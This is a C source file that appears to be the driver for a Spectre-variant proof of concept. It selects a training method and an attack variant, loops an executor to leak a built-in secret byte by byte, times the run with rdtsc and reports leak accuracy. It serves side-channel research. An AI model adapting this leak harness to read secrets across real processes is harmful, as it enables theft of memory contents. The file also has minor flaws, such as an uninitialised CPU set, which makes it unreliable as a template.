#include "util.h"

int main(int argc, const char **argv) {
    #ifdef linux
        // encourage core affinities
        printf("pinning to core 0\n");
        cpu_set_t cpu_pool;
        CPU_SET(0,&cpu_pool); // only need to care about parent, child inherits parent's
        int res = sched_setaffinity(0,1,&cpu_pool);
        printf("result %d \n", res);

    #endif

    uint64_t total_start;
    uint64_t total_end;


    struct memSetup m;

    setup(&m);


    struct runData r;
    r.ops = 0;
    r.start = 0;
    r.end = 0;
    memset(r.op_times,0,MAX_DATA);


    int j = 0;

    printf("enter options\n");
    int tmp = 0;
    scanf("%d",&tmp);
    int tmp2 = 1;
    scanf("%d",&tmp2);

    pid_t pid = 0;
    char* test_name;
    char* train_method;
    void (*trainer)();
    void (*executor)(void(), runData*, memSetup*, int*, pid_t);

    if (tmp == 0){
        trainer = train_ip;
        train_method = "ip";
    } else{
        trainer = train_oop;
        train_method = "oop";
    }

    if (tmp2 == 0){
        executor = sa;
        test_name = "sa";
    } else if (tmp2 == 1){
        executor = ca;
        test_name = "ca";
    } else{
        executor = stl;
        test_name = "stl";
        train_method = "";
    }
    

    printf("test: spectre-%s-%s \n\n",test_name,train_method);
    if (tmp2 == 1){
        pid = fork();
    }
    nice(-30);
    int size_bound = (tmp2 < 2) ? sizeof(DATA_SECRET) : sizeof(SECRET);
    
    #if USE_RDTSC_BEGIN_END
      total_start = rdtsc_begin();
      #else
      total_start = rdtsc();
    #endif
    
    while(r.ops < MAX_DATA) {
        // for every byte in the string
        j = (j + 1) % size_bound;
        printf("\033[F(process info) ");
        printf("pgid: %5d, pid: %5d \r\n",__getpgid(pid),pid);
        executor(trainer,&r,&m,&j,pid);
        if(!strncmp(m.leaked + sizeof(DATA) - 1, SECRET, sizeof(SECRET) - 1)) break;
    }
    #if USE_RDTSC_BEGIN_END
      total_end = rdtsc_begin();
      #else
      total_end = rdtsc();
    #endif

    if (pid != 0){
        kill(pid,SIGTERM);
    }
    printf("\n\x1b[1A[ ]\n\n[\x1b[32m>\x1b[0m] Done, %u cycles\n", (total_end - total_start));
    sleep(1);

    FILE *fptr;
    fptr = fopen("ca_ip.csv","w");
    
    analyseOpData(&r,fptr);
    free(m._mem);


    int exact = 0;
    int offset = (tmp2 == 2) ? 0 : sizeof(DATA) -1;
    for (int i = 0; i < sizeof(SECRET); i++){
        if (m.leaked[i + offset] == SECRET[i]){
            exact++;
        }
    }
    printf("accuracy: %f \n",(float)(exact) / (sizeof(SECRET) - 1));
    fclose(fptr);
}
